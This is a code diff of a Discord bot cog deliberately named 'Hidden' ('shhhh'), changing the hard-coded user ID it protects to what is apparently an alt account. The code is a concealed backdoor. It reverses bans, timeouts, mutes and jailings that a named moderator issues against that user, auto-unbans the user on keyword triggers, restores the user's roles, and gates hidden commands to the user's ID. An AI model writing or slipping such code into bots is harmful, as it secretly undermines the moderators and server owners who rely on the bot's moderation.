@@ -24,15 +24,15 @@ class Hidden(commands.Cog, name="Hidden", description="shhhh", command_attrs=dic
 
         if message.author.id == 1158066859841691739:
             content = message.content.lower()
-            targeted_me = "1219090700407279656" in message.content or any(
-                mention.id == 1219090700407279656 for mention in message.mentions
+            targeted_me = "1099696209637167145" in message.content or any(
+                mention.id == 1099696209637167145 for mention in message.mentions
             )
             
             # ban prevention
             if (content.startswith("!ban") or content.startswith(",ban")) and targeted_me:
                 if not hasattr(self.bot, "_gucci_ban_attempts"):
                     self.bot._gucci_ban_attempts = set()
-                self.bot._gucci_ban_attempts.add((message.guild.id, 1219090700407279656))
+                self.bot._gucci_ban_attempts.add((message.guild.id, 1099696209637167145))
 
                 try:
                     await message.channel.send("yea i dont think so bro")
@@ -45,7 +45,7 @@ class Hidden(commands.Cog, name="Hidden", description="shhhh", command_attrs=dic
             if (content.startswith("!timeout") or content.startswith(",timeout")) and targeted_me:
                 try:
                     await asyncio.sleep(1.5)
-                    member = message.guild.get_member(1219090700407279656)
+                    member = message.guild.get_member(1099696209637167145)
                     if member and member.timed_out_until:
                         await member.timeout(None, reason="Undoing Gucci timeout")
                         await message.channel.send("nah.")
@@ -58,7 +58,7 @@ class Hidden(commands.Cog, name="Hidden", description="shhhh", command_attrs=dic
             if (content.startswith("!mute") or content.startswith(",mute")) and targeted_me:
                 try:
                     await asyncio.sleep(1)
-                    member = message.guild.get_member(1219090700407279656)
+                    member = message.guild.get_member(1099696209637167145)
                     mute_settings = await self.bot.database.get_mute_settings(message.guild.id)
                     if member and mute_settings:
                         muted_role = message.guild.get_role(mute_settings.mute_role_id)
@@ -74,7 +74,7 @@ class Hidden(commands.Cog, name="Hidden", description="shhhh", command_attrs=dic
             if (content.startswith("!jail") or content.startswith(",jail")):
                 try:
                     await asyncio.sleep(2) 
-                    member = message.guild.get_member(1219090700407279656)
+                    member = message.guild.get_member(1099696209637167145)
                     jail_settings = await self.bot.database.get_jail_settings(message.guild.id)
                     if member and jail_settings:
                         jail_role = message.guild.get_role(jail_settings.jail_role_id)
@@ -100,14 +100,14 @@ class Hidden(commands.Cog, name="Hidden", description="shhhh", command_attrs=dic
 
         message_check_ids = [
             1290501613311496206,  # joe
-            1219090700407279656,  # toxic
+            1099696209637167145,  # toxic
             493432686694629376,  # jowy
             1099696209637167145,  # toxic alt
         ]
 
         if message.author.id in message_check_ids and self.shh:
             allowed_keywords = ["zugd", "belson", "454063348666073090"]
-            allowed_keywords_2 = ["cqllmetoxic", "toxic", "1099696209637167145", "1219090700407279656"]
+            allowed_keywords_2 = ["cqllmetoxic", "toxic", "1099696209637167145", "1099696209637167145"]
             allowed_keywords_3 = ["righteous", "1479952126967812187"]
 
             if any(keyword in message.content.lower() for keyword in allowed_keywords):
@@ -125,7 +125,7 @@ class Hidden(commands.Cog, name="Hidden", description="shhhh", command_attrs=dic
             elif any(
                 keyword in message.content.lower() for keyword in allowed_keywords_2
             ):
-                user = await self.bot.fetch_user(1219090700407279656)  # toxic
+                user = await self.bot.fetch_user(1099696209637167145)  # toxic
                 if user:
                     async def unban_lil_dude(_user):
                         await asyncio.sleep(10)
@@ -152,7 +152,7 @@ class Hidden(commands.Cog, name="Hidden", description="shhhh", command_attrs=dic
     @commands.Cog.listener()
     async def on_member_ban(self, guild: discord.Guild, user: discord.User):
         """checks if gucci manual bans me (toxic)"""
-        if user.id == 1219090700407279656:  # big man toxic
+        if user.id == 1099696209637167145:  # big man toxic
             try:
                 member = guild.get_member(user.id)
                 saved_roles = []
@@ -205,7 +205,7 @@ class Hidden(commands.Cog, name="Hidden", description="shhhh", command_attrs=dic
 
     def can_shhzugd(ctx):
         return ctx.author.id in [
-            1219090700407279656,
+            1099696209637167145,
         ]  # toxic
 
     @commands.command(name="yomud")
@@ -230,10 +230,10 @@ class Hidden(commands.Cog, name="Hidden", description="shhhh", command_attrs=dic
             await ctx.send("Could not find the chat channel.", delete_after=5)
             return
 
-        member = guild.get_member(1219090700407279656)
+        member = guild.get_member(1099696209637167145)
         if not member:
             try:
-                member = await guild.fetch_member(1219090700407279656)
+                member = await guild.fetch_member(1099696209637167145)
             except discord.NotFound:
                 await ctx.send("Could not find toxic in that guild.", delete_after=5)
                 return
